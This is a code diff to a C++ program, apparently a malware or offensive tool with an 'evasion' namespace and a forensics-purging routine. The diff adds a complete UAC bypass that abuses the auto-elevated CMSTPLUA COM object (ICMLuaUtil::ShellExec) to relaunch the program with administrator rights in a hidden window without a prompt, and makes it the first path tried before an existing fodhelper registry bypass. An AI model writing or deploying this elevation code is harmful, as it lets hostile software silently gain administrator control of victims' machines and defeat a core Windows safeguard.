@@ -1897,6 +1897,67 @@ namespace vex {
             PurgeForensics();
         }
 
+        // UACME #67: the auto-elevated CMSTPLUA COM object exposes
+        // ICMLuaUtil::ShellExec. It launches an elevated child without a
+        // registry footprint and without the ms-settings handler that modern
+        // builds increasingly restrict. Silent unless UAC is set to always
+        // prompt.
+        static bool TryICMLuaUtil(const std::wstring& selfPath,
+                const std::wstring& extraArgs = L"") {
+            const CLSID clsid = { 0x3E5FC7F9, 0x9A51, 0x4367,
+                { 0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7 } };
+            const IID iid = { 0x6EDD6D74, 0xC007, 0x4E75,
+                { 0xB7, 0x6A, 0xE5, 0x14, 0x8D, 0x4B, 0x4C, 0x2E } };
+            struct ICMLuaUtil : public IUnknown {
+                virtual HRESULT STDMETHODCALLTYPE ShellExec(
+                    LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory,
+                    ULONG fMask, ULONG nShow) = 0;
+            };
+
+            HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
+            bool uninit = SUCCEEDED(hr);
+            if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return false;
+
+            wchar_t guid[64]{};
+            if (!StringFromGUID2(clsid, guid, 64)) {
+                if (uninit) CoUninitialize();
+                return false;
+            }
+            std::wstring moniker = L"Elevation:Administrator!new:" + std::wstring(guid);
+            IUnknown* unknown = nullptr;
+            hr = CoGetObject(moniker.c_str(), NULL, IID_IUnknown,
+                (void**)&unknown);
+            if (FAILED(hr) || !unknown) {
+                if (uninit) CoUninitialize();
+                return false;
+            }
+            ICMLuaUtil* util = nullptr;
+            hr = unknown->QueryInterface(iid, (void**)&util);
+            unknown->Release();
+            if (FAILED(hr) || !util) {
+                if (uninit) CoUninitialize();
+                return false;
+            }
+
+            std::wstring evt = L"Local\\vxu" + utils::RandomHex(8);
+            HANDLE event = CreateEventW(NULL, TRUE, FALSE, evt.c_str());
+            if (!event) {
+                util->Release();
+                if (uninit) CoUninitialize();
+                return false;
+            }
+            std::wstring cmd = L"\"" + selfPath + L"\" --uac-child --uac-event \"" +
+                evt + L"\"";
+            if (!extraArgs.empty()) cmd += L" " + extraArgs;
+            hr = util->ShellExec(cmd.c_str(), NULL, NULL, 0, SW_HIDE);
+            bool ok = SUCCEEDED(hr) &&
+                WaitForSingleObject(event, 10000) == WAIT_OBJECT_0;
+            CloseHandle(event);
+            util->Release();
+            if (uninit) CoUninitialize();
+            return ok;
+        }
+
         // Silent elevation before the runas prompt. fodhelper/computerdefaults
         // auto-elevate and execute the HKCU ms-settings command. The elevated
         // child signals a random per-attempt event.
@@ -7111,7 +7172,8 @@ int main(int argc, char* argv[]) {
         wchar_t self[MAX_PATH]{};
         if (GetModuleFileNameW(NULL, self, MAX_PATH)) {
             std::wstring tail = vex::utils::CommandLineTail();
-            // Silent path first; the runas prompt is the fallback.
+            // Silent paths first; the runas prompt is the fallback.
+            if (vex::evasion::TryICMLuaUtil(self, tail)) return 0;
             if (vex::evasion::TryUACBypass(self, tail)) return 0;
             SHELLEXECUTEINFOW sei{ sizeof(sei) };
             std::wstring params = L"--uac-child";
